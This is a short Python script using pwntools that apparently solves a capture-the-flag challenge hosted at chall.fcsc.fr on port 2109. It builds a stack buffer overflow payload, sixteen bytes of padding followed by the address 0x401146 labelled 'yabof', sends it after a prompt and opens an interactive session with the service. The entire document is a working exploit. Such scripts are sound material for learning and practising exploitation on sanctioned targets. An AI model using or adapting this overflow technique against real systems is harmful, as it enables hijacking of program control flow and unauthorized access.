from pwn import *
# context.log_level = "error"



# Constantes
yabof = 0x401146

# Payload
pld  = b"A"*8
pld += b"B"*8
pld += p64(yabof)

# Exploit
io = remote("chall.fcsc.fr", 2109)
io.recvuntil(b"(y/N)?\n")
io.sendline(pld)
io.interactive()






